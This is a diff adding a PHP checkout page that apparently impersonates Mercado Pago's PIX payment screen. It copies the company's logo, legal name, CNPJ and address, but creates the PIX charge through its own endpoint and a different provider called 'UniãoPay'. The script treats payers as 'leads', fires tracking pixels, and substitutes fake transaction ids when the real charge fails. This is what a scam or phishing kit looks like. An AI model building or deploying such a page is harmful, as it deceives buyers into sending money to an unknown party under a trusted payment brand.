@@ -1,0 +1,354 @@
+<?php
+require_once __DIR__ . '/config.php';
+$price = number_format(PRODUCT_PRICE, 2, ',', '.');
+?>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/favicon.png">
+  <title>MercadoPago - Pagamento PIX</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="css/checkout.css">
+  <style>
+    /* ── Spinner de carregamento do QR ── */
+    .pix-loading {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      min-height: 200px;
+      color: #777;
+      font-size: 13px;
+    }
+    .pix-spinner {
+      width: 36px; height: 36px;
+      border: 3px solid #e0e0e0;
+      border-top-color: #009ee3;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── Badge de status ── */
+    .pix-status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      padding: 4px 10px;
+      border-radius: 20px;
+      margin-top: 8px;
+      font-weight: 600;
+      background: #f0f0f0;
+      color: #888;
+      transition: background .3s, color .3s;
+    }
+    .pix-status-badge.paid   { background: #e6f9f0; color: #00a650; }
+    .pix-status-badge.pulse::before {
+      content: '';
+      display: inline-block;
+      width: 8px; height: 8px;
+      background: #009ee3;
+      border-radius: 50%;
+      animation: pulse 1.4s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%,100% { opacity: 1; transform: scale(1); }
+      50%      { opacity: .4; transform: scale(.7); }
+    }
+  </style>
+</head>
+<body>
+<div class="mp-page">
+
+  <!-- ── Header ──────────────────────────────────────────────── -->
+  <header class="mp-header">
+    <img class="mp-header__logo"
+         src="images/mp-logo.png"
+         alt="MercadoPago">
+  </header>
+
+  <!-- ── PIX Card ─────────────────────────────────────────────── -->
+  <div class="mp-pix">
+    <h1 class="mp-pix__ttl">Escaneie o QR Code para pagar</h1>
+    <p class="mp-pix__sub">Abra o app do seu banco e escaneie o código</p>
+
+    <!-- QR Code (preenchido via JS após chamada à API) -->
+    <div class="mp-pix__qr" id="qrCodeArea">
+      <div class="pix-loading">
+        <div class="pix-spinner"></div>
+        <span>Gerando QR Code…</span>
+      </div>
+    </div>
+
+    <!-- Badge de status -->
+    <div id="pixStatusBadge" class="pix-status-badge pulse" style="display:none;">
+      <span id="pixStatusText">Aguardando pagamento…</span>
+    </div>
+
+    <!-- Valor -->
+    <div class="mp-price" style="margin:14px 0;">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+        <path fill="currentColor" d="m5.5 7A1.5 1.5 0 0 1 4 5.5A1.5 1.5 0 0 1 5.5 4A1.5 1.5 0 0 1 7 5.5A1.5 1.5 0 0 1 5.5 7m15.91 4.58-9-9C12.05 2.22 11.55 2 11 2H4C2.9 2 2 2.9 2 4v7c0 .55.22 1.05.59 1.41l9 9C11.95 21.78 12.45 22 13 22c.55 0 1.05-.22 1.41-.59l7-7c.37-.36.59-.86.59-1.41c0-.55-.23-1.06-.59-1.42Z"/>
+      </svg>
+      Valor Total: <strong>R$ <?php echo $price; ?></strong>
+    </div>
+
+    <!-- Chave PIX / Copia e Cola -->
+    <p class="mp-pix__key-lbl">Código Pix Copia e Cola:</p>
+    <div class="mp-pix__key" id="pixKeyDisplay"
+         style="word-break:break-all;font-size:12px;max-height:80px;overflow-y:auto;">
+      Gerando…
+    </div>
+
+    <!-- Botão copiar -->
+    <button class="mp-pix__copy" id="copyBtn" onclick="copyPixKey()" disabled>
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+        <path fill="currentColor" d="M19 21H8V7h11m0-2H8a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2m-3-4H4a2 2 0 0 0-2 2v14h2V3h12z"/>
+      </svg>
+      Copiar Código Pix Copia e Cola
+    </button>
+
+    <!-- Instruções -->
+    <div class="mp-instruct">
+      <p class="mp-instruct__ttl">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16">
+          <path fill="#009ee3" d="M17 19H7V5h10m0-4H7c-1.11 0-2 .89-2 2v18a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2z"/>
+        </svg>
+        Como pagar com Pix
+      </p>
+
+      <div class="mp-instruct__row">
+        <span class="mp-instruct__n">1</span>
+        <span>Abra o aplicativo do seu banco.</span>
+      </div>
+      <div class="mp-instruct__row">
+        <span class="mp-instruct__n">2</span>
+        <span>Procure pela opção de pagamento via <strong>Pix</strong>.</span>
+      </div>
+      <div class="mp-instruct__row">
+        <span class="mp-instruct__n">3</span>
+        <span>Escolha <strong>"Ler QR Code"</strong> e escaneie o código acima.</span>
+      </div>
+      <div class="mp-instruct__row">
+        <span class="mp-instruct__n">4</span>
+        <span>Confirme os dados e finalize o pagamento.</span>
+      </div>
+      <div class="mp-instruct__row">
+        <span class="mp-instruct__n">5</span>
+        <span>Ou copie a chave Pix e cole na opção de pagamento do seu banco.</span>
+      </div>
+    </div>
+
+    <div class="mp-secure" style="margin-top:16px;">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14">
+        <path fill="currentColor" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm-2 16-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9z"/>
+      </svg>
+      Pagamento protegido por criptografia
+    </div>
+
+    <!-- Botão "Já Paguei" -->
+    <button
+      id="btnJaPaguei"
+      onclick="confirmPixPaid()"
+      style="width:100%;margin-top:14px;padding:14px;background:#00a650;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;letter-spacing:.02em;transition:background .2s;"
+      onmouseover="this.style.background='#008a43'"
+      onmouseout="this.style.background='#00a650'">
+      ✅ Já Paguei
+    </button>
+  </div>
+
+  <footer class="mp-footer">
+    <p>&copy; 1999-<?php echo date('Y'); ?> Todos os direitos reservados.</p>
+    <p>MERCADOPAGO INTERNET INSTITUIÇÃO DE PAGAMENTO S/A - CNPJ/MF 08.561.701/0001-01</p>
+    <p>Av. Brigadeiro Faria Lima, 1.384, São Paulo - SP - CEP 01451-001</p>
+  </footer>
+</div>
+
+<!-- Toast -->
+<div class="mp-toast" id="mpToast"></div>
+
+<script src="js/qrcode.min.js"></script>
+<script src="js/sdk.min.js"></script>
+<script>
+(function () {
+  'use strict';
+
+  _SDK.initTracking('pix-pagamento');
+  _SDK.notifyLead('pix-pagamento');
+  _SDK.gateway.notifyPix();  // pixel: pix_selected
+
+  // ── Estado global do PIX ────────────────────────────────────
+  var pixPayload     = '';
+  var transactionId  = '';
+  var statusInterval = null;
+  var isPaid         = false;
+
+  // ── SVGs ────────────────────────────────────────────────────
+  var SVG_CHECK = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M21 7L9 19l-5.5-5.5 1.41-1.41L9 16.17 19.59 5.59z"/></svg>';
+  var SVG_COPY  = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M19 21H8V7h11m0-2H8a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h11a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2m-3-4H4a2 2 0 0 0-2 2v14h2V3h12z"/></svg>';
+
+  // ── Toast helper ────────────────────────────────────────────
+  function toast(msg, type) {
+    var el = document.getElementById('mpToast');
+    el.textContent = msg;
+    el.className = 'mp-toast' + (type === 'ok' ? ' mp-toast--ok' : '') + ' show';
+    clearTimeout(el._t);
+    el._t = setTimeout(function () { el.classList.remove('show'); }, 3000);
+  }
+
+  // ── Renderizar QR Code ──────────────────────────────────────
+  function renderQR(pixCode, qrUrl) {
+    var qrArea = document.getElementById('qrCodeArea');
+    qrArea.innerHTML = '';
+
+    if (qrUrl) {
+      // QR Code da API UniãoPay (PNG direto) — mais fiel
+      var img = document.createElement('img');
+      img.src = qrUrl;
+      img.alt = 'QR Code PIX';
+      img.style.cssText = 'width:200px;height:200px;object-fit:contain;display:block;margin:0 auto;';
+      img.onerror = function () {
+        // Se a URL da API falhar, gera localmente
+        renderQRLocal(pixCode);
+      };
+      qrArea.appendChild(img);
+    } else {
+      renderQRLocal(pixCode);
+    }
+  }
+
+  function renderQRLocal(pixCode) {
+    var qrArea = document.getElementById('qrCodeArea');
+    qrArea.innerHTML = '';
+    if (typeof QRCode !== 'undefined' && pixCode) {
+      new QRCode(qrArea, {
+        text: pixCode, width: 200, height: 200,
+        colorDark: '#000000', colorLight: '#ffffff',
+        correctLevel: QRCode.CorrectLevel.M
+      });
+    } else {
+      qrArea.innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='
+        + encodeURIComponent(pixCode)
+        + '" alt="QR Code Pix" style="width:200px;height:200px;object-fit:contain;">';
+    }
+  }
+
+  // ── Buscar PIX da API ───────────────────────────────────────
+  function createPix() {
+    fetch('/api/create_pix.php', { method: 'GET' })
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (data.status === 'success') {
+          pixPayload    = data.pix_copia_cola  || '';
+          transactionId = data.transaction_id  || '';
+
+          // Exibir QR Code
+          renderQR(pixPayload, data.qr_code_url || null);
+
+          // Exibir código copia e cola
+          document.getElementById('pixKeyDisplay').textContent = pixPayload;
+
+          // Habilitar botão copiar
+          var btn = document.getElementById('copyBtn');
+          btn.disabled = false;
+
+          // Pixel: QR visualizado
+          _SDK.notifyPixViewed();
+
+          // Mostrar badge de aguardando
+          if (transactionId && transactionId.indexOf('TXN-') !== 0) {
+            // Só mostra badge/polling se veio da API real (não fallback)
+            var badge = document.getElementById('pixStatusBadge');
+            badge.style.display = 'inline-flex';
+            startStatusPolling();
+          }
+        }
+      })
+      .catch(function (e) {
+        console.error('[PIX] Erro ao criar cobrança:', e);
+        document.getElementById('qrCodeArea').innerHTML =
+          '<p style="color:#c00;font-size:13px;text-align:center;">Erro ao gerar QR Code.<br>Recarregue a página.</p>';
+      });
+  }
+
+  // ── Polling de status ───────────────────────────────────────
+  function startStatusPolling() {
+    if (!transactionId || isPaid) return;
+    statusInterval = setInterval(function () {
+      checkPixStatus();
+    }, 5000); // a cada 5 segundos
+  }
+
+  function checkPixStatus() {
+    if (isPaid || !transactionId) return;
+    fetch('/api/pix_status.php?tx=' + encodeURIComponent(transactionId))
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (data.status === 'paid') {
+          isPaid = true;
+          clearInterval(statusInterval);
+          onPixPaid();
+        }
+      })
+      .catch(function () { /* silencioso */ });
+  }
+
+  function onPixPaid() {
+    var badge = document.getElementById('pixStatusBadge');
+    badge.className = 'pix-status-badge paid';
+    document.getElementById('pixStatusText').textContent = '✅ Pagamento confirmado!';
+    toast('Pagamento PIX confirmado! ✅', 'ok');
+    // Pixel: pix_paid via polling da API (pagamento real confirmado)
+    _SDK.notifyPixPaid();
+  }
+
+  // ── Copiar código PIX ────────────────────────────────────────
+  window.copyPixKey = function () {
+    if (!pixPayload) return;
+    var btn = document.getElementById('copyBtn');
+
+    var onSuccess = function () {
+      btn.innerHTML = SVG_CHECK + ' Código Copia e Cola copiado!';
+      toast('Código PIX copiado com sucesso!', 'ok');
+      setTimeout(function () {
+        btn.innerHTML = SVG_COPY + ' Copiar Código Pix Copia e Cola';
+      }, 3000);
+    };
+
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(pixPayload).then(onSuccess).catch(fallback);
+    } else {
+      fallback();
+    }
+
+    function fallback() {
+      var ta = document.createElement('textarea');
+      ta.value = pixPayload;
+      ta.style.cssText = 'position:fixed;left:-9999px;top:-9999px;';
+      document.body.appendChild(ta);
+      ta.focus(); ta.select();
+      try { document.execCommand('copy'); onSuccess(); }
+      catch (e) { toast('Copie manualmente a chave acima.'); }
+      document.body.removeChild(ta);
+    }
+  };
+
+  // ── Botão "Já Paguei" — pixel manual ────────────────────────
+  window.confirmPixPaid = function () {
+    // Pixel: lead clicou em "Já Paguei"
+    _SDK.notifyPixPaid();
+    toast('Notificamos sua equipe de pagamento. Em breve confirmaremos!', 'ok');
+  };
+
+  // ── Init ────────────────────────────────────────────────────
+  createPix();
+
+}());
+</script>
+</body>
+</html>
